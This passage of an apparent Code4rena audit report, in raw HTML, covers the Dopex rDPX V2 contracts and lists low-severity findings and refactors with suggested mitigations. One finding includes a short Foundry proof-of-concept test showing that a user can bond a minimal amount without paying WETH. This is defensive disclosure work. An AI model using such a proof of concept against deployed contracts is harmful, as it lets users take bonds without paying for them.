style=\"position:relative;\"><a href=\"#impact-5\" aria-label=\"impact 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Users can bond without 1 wei providing any WETH. This may break any assumptions regarding accountability of the Core contract, or may be combined with other issues to achieve a more critical one. This step may also be used in a <code>for</code> loop to increase the amount without providing WETH.</p>\n<h3 id=\"proof-of-concept-24\" style=\"position:relative;\"><a href=\"#proof-of-concept-24\" aria-label=\"proof of concept 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Add this test to <code>tests/rdpxV2-core/Unit.t.sol</code> and run <code>forge test --mt \"testBondNoEthCost\"</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"91\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testBondNoEthCost</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initialWethBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bond</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">finalWethBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">initialWethBalance</span><span class=\"mtk1\">, </span><span class=\"mtk12\">finalWethBalance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-25\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-25\" aria-label=\"recommended mitigation steps 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Validate that the returned <code>wethRequired</code> of the <code>calculateBondCost()</code> is greater than 0.</p>\n<h2 id=\"l-02---decreaseamount-function-name-is-misleading\" style=\"position:relative;\"><a href=\"#l-02---decreaseamount-function-name-is-misleading\" aria-label=\"l 02   decreaseamount function name is misleading permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] - <code>decreaseAmount</code> function name is misleading</h2>\n<p><code>RdpxDecayingBonds::decreaseAmount()</code> does not decrease the bonds amount, but replaces its value. This is misleading and can lead to integration errors if they follow the Natspec: <code>amount: amount to decrease</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"92\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">/// @param amount amount to decrease // @audit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">decreaseAmount</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bondId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">RDPXV2CORE_ROLE</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_whenNotPaused</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bonds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bondId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">rdpxAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @audit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/decaying-bonds/RdpxDecayingBonds.sol#L144\">RdpxDecayingBonds.sol#L144</a></p>\n<p>The only call to the function in the current scope is performed on the <code>RdpxV2Core</code> contract.</p>\n<p>In this case the <code>amount</code> passed to the <code>decreaseAmount()</code> function is the expected decreased value, so the whole system works as expected.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"93\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IRdpxDecayingBonds</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rdpxDecayingBonds</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decreaseAmount</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_bondId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">_rdpxAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L645\">RdpxV2Core.sol#L645</a></p>\n<p>Nevertheless, this can lead to future errors.</p>\n<h3 id=\"recommended-mitigation-steps-26\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-26\" aria-label=\"recommended mitigation steps 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change the name of the function to a better name like <code>updateAmount()</code>, or refactor the function and its calls to match its description.</p>\n<h2 id=\"l-03---addassettotokenreserves-doesnt-check-that-there-is-no-token-with-the-same-symbol\" style=\"position:relative;\"><a href=\"#l-03---addassettotokenreserves-doesnt-check-that-there-is-no-token-with-the-same-symbol\" aria-label=\"l 03   addassettotokenreserves doesnt check that there is no token with the same symbol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] - <code>addAssetTotokenReserves()</code> doesn’t check that there is no token with the same symbol</h2>\n<p>The function checks that the token address is not used, but doesn’t check for the symbol.</p>\n<p>Different tokens may have the same symbol, which can be troublesome, as certain operations rely on the symbol.</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L240-L264\">RdpxV2Core.sol#L240-L264</a></li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-27\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-27\" aria-label=\"recommended mitigation steps 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p> Verify that the token symbol is not previously used</p>\n<h2 id=\"l-04---the-removeassetfromtokenreserves-removes-tokens-by-symbol-instead-of-per-address\" style=\"position:relative;\"><a href=\"#l-04---the-removeassetfromtokenreserves-removes-tokens-by-symbol-instead-of-per-address\" aria-label=\"l 04   the removeassetfromtokenreserves removes tokens by symbol instead of per address permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-04] - The <code>removeAssetFromtokenReserves()</code> removes tokens by symbol instead of per address</h2>\n<p>The <code>removeAssetFromtokenReserves()</code> function removes the first token it finds with a specified symbol, which may lead to an error, as multiple tokens can be added with the same symbol.</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L270-L290\">RdpxV2Core.sol#L270-L290</a></li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-28\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-28\" aria-label=\"recommended mitigation steps 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Remove tokens by their address instead of by their symbol.</p>\n<h2 id=\"l-05---approvals-cant-be-completely-revoked\" style=\"position:relative;\"><a href=\"#l-05---approvals-cant-be-completely-revoked\" aria-label=\"l 05   approvals cant be completely revoked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-05] - Approvals can’t be completely revoked</h2>\n<p>The <code>approveContractToSpend()</code> function requires that the approved amount is > 0. This means that the function is not capable of revoke token approvals by setting them to 0.</p>\n<p>This is also troublesome, as it is the expected behavior if a token approval wants to be removed. It can still be mitigated by sending a value of 1.</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/amo/UniV2LiquidityAmo.sol#L133\">UniV2LiquidityAmo.sol#L133</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L410\">RdpxV2Core.sol#L410</a></li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-29\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-29\" aria-label=\"recommended mitigation steps 29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Remove the unnecessary requirement of <code>amount > 0</code>.</p>\n<h2 id=\"l-06---unnecessary-role-check\" style=\"position:relative;\"><a href=\"#l-06---unnecessary-role-check\" aria-label=\"l 06   unnecessary role check permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-06] - Unnecessary role check</h2>\n<p>Role is checked both on the modifier and the function body. Consider removing one:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"94\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expiry</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MINTER_ROLE</span><span class=\"mtk1\">) { </span><span class=\"mtk3\">// @audit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_whenNotPaused</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">hasRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MINTER_ROLE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Caller is not a minter&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/decaying-bonds/RdpxDecayingBonds.sol#L114-L120\">RdpxDecayingBonds.sol#L114-L120</a></p>\n<h2 id=\"l-07---rdpxv2core_role-is-not-assigned-in-perpetualatlanticvault\" style=\"position:relative;\"><a href=\"#l-07---rdpxv2core_role-is-not-assigned-in-perpetualatlanticvault\" aria-label=\"l 07   rdpxv2core_role is not assigned in perpetualatlanticvault permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-07] - <code>RDPXV2CORE_ROLE</code> is not assigned in <code>PerpetualAtlanticVault</code></h2>\n<p>While the <code>DEFAULT_ADMIN_ROLE</code>, and <code>MANAGER_ROLE</code> are assigned during the <code>constructor()</code>, the <code>RDPXV2CORE_ROLE</code> is not.</p>\n<p>Any call from the Core contract to the vault will revert until this value is set, so it would be advised to assign this role in the constructor as well.</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L113-L128\">PerpetualAtlanticVault.sol#L113-L128</a></p>\n<h2 id=\"refactor-01---unnecessary-struct-attribute-prefix\" style=\"position:relative;\"><a href=\"#refactor-01---unnecessary-struct-attribute-prefix\" aria-label=\"refactor 01   unnecessary struct attribute prefix permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[Refactor-01] - Unnecessary struct attribute prefix</h2>\n<p><code>TokenAInfo</code> attributes are all prefixed with <code>tokenA</code>. This is unnecessary, as they are known to be from a <code>TokenAInfo</code> struct. Consider removing the prefix:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"95\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TokenAInfo</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// tokenA reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenAReserve</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// rdpx price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenAPrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// tokenA LP reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenALpReserve</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/reLP/ReLPContract.sol#L51-L58\">ReLPContract.sol#L51-L58</a></p>\n<h2 id=\"refactor-02---repeated-expression\" style=\"position:relative;\"><a href=\"#refactor-02---repeated-expression\" aria-label=\"refactor 02   repeated expression permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[Refactor-02] - Repeated expression</h2>\n<p>Long expression that are repeated can lead to errors if refactored, and are harder to read.</p>\n<p>Consider creating a variable to store the expression <code>(currentFundingRate * (nextFundingPaymentTimestamp() - startTime)) / 1e18</code>, which is repeated 3 times:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"96\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">collateralToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">perpetualAtlanticVaultLP</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">currentFundingRate</span><span class=\"mtk1\"> * (</span><span class=\"mtk11\">nextFundingPaymentTimestamp</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">)) / </span><span class=\"mtk3\">// @audit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1e18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">IPerpetualAtlanticVaultLP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">perpetualAtlanticVaultLP</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span 